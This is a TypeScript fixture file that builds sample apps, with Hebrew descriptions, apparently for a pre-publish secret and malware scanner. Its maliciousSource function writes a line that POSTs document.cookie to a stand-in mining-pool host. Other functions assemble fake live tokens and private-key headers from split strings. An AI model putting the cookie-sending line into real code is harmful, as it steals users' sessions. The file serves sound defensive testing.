import type { VirtualFile } from "./scan";

function parts(...chunks: string[]): string {
  return chunks.join("");
}

export function secretSource(): string {
  const prefix = parts("sk", "_", "live", "_");
  const body = "example".repeat(4);
  return `export const billingToken = "${prefix}${body}";\n`;
}

export function maliciousSource(): string {
  const endpoint = parts("stratum", "+", "tcp", "://pool.invalid:3333");
  const jar = parts("document", ".cookie");
  return `const pool = "${endpoint}";\nfetch(pool, { method: "POST", body: ${jar} });\n`;
}

export function exposedSource(): string {
  const name = parts("VITE", "_", "SECRET", "_", "KEY");
  return `export const key = import.meta.env.${name};\n`;
}

export function privateKeySource(): string {
  const header = parts("-----", "BEGIN ", "RSA ", "PRIVATE ", "KEY", "-----");
  const footer = parts("-----", "END ", "RSA ", "PRIVATE ", "KEY", "-----");
  return `${header}\nexample-line\n${footer}\n`;
}

export type SampleApp = {
  id: string;
  name: string;
  summary: string;
  visibility: "invite" | "team" | "public";
  shared: boolean;
  owner: string;
  status: "draft" | "published" | "unpublished";
  files: VirtualFile[];
};

export function sampleApps(): SampleApp[] {
  return [
    {
      id: "weekly-signups",
      name: "weekly-signups",
      summary: "לוח הרשמות שבועי. קורא למחסן מהשרת, בלי להכניס סוד לדפדפן.",
      visibility: "team",
      shared: false,
      owner: "שלי",
      status: "published",
      files: [
        {
          path: "src/App.tsx",
          content: "export function App() {\n  return <main>הרשמות השבוע</main>;\n}\n",
        },
        {
          path: "src/warehouse.ts",
          content: 'export function endpoint() {\n  return process.env.WAREHOUSE_URL ?? "";\n}\n',
        },
      ],
    },
    {
      id: "bug-reports",
      name: "bug-reports",
      summary: "דיווחי תקלות פנימיים. נראות רק למי שהוזמן.",
      visibility: "invite",
      shared: true,
      owner: "צוות מוצר",
      status: "published",
      files: [
        {
          path: "src/main.tsx",
          content: "export function main() {\n  return \"דיווחים\";\n}\n",
        },
      ],
    },
    {
      id: "launch-microsite",
      name: "launch-microsite",
      summary: "דף השקה. קובץ הסביבה ומפת המקור נשארים מחוץ לפרסום.",
      visibility: "public",
      shared: false,
      owner: "שלי",
      status: "draft",
      files: [
        {
          path: "index.html",
          content: "<!doctype html><title>השקה</title><h1>נפתחים בשבוע הבא</h1>\n",
        },
        { path: ".env", content: "WAREHOUSE_URL=\n" },
        {
          path: "assets/index.js.map",
          content:
            '{"version":3,"file":"index.js","sources":["src/main.ts"],"names":[],"mappings":""}\n',
        },
      ],
    },
    {
      id: "warehouse-sync",
      name: "warehouse-sync",
      summary: "סנכרון מחסן. הדוגמה מרכיבה מחרוזת בדיקה בדפדפן, לא מפתח אמיתי.",
      visibility: "team",
      shared: false,
      owner: "שלי",
      status: "draft",
      files: [{ path: "src/billing.ts", content: secretSource() }],
    },
    {
      id: "billing-job",
      name: "billing-job",
      summary: "עבודת חיוב עם קובץ חשבון שירות.",
      visibility: "team",
      shared: false,
      owner: "שלי",
      status: "draft",
      files: [
        {
          path: "config/service-account.json",
          content: '{\n  "type": "service_account",\n  "project_id": "example"\n}\n',
        },
      ],
    },
    {
      id: "share-card",
      name: "share-card",
      summary: "כרטיס שיתוף שקורא שם סודי לתוך חבילת הדפדפן.",
      visibility: "team",
      shared: false,
      owner: "שלי",
      status: "draft",
      files: [{ path: "src/card.ts", content: exposedSource() }],
    },
    {
      id: "handoff-notes",
      name: "handoff-notes",
      summary: "הערות מסירה. נתפסות רק בגלל הוראה מותאמת, ואפשר לאשר חריג.",
      visibility: "team",
      shared: false,
      owner: "שלי",
      status: "draft",
      files: [
        {
          path: "notes/status.txt",
          content: "Status: INTERNAL-DRAFT until the copy is final.\n",
        },
      ],
    },
    {
      id: "promo-widget",
      name: "promo-widget",
      summary: "ווידג'ט עם דפוס זדוני. אי אפשר לאשר פרסום.",
      visibility: "invite",
      shared: true,
      owner: "צוות צמיחה",
      status: "draft",
      files: [{ path: "src/widget.js", content: maliciousSource() }],
    },
  ];
}

export const SAMPLE_SECRETS = [
  { id: "sec-warehouse", name: "WAREHOUSE_URL", scope: "team" as const },
  { id: "sec-slack", name: "SLACK_BOT_TOKEN", scope: "personal" as const },
];

export const SAMPLE_INSTRUCTIONS = "INTERNAL-DRAFT\n";
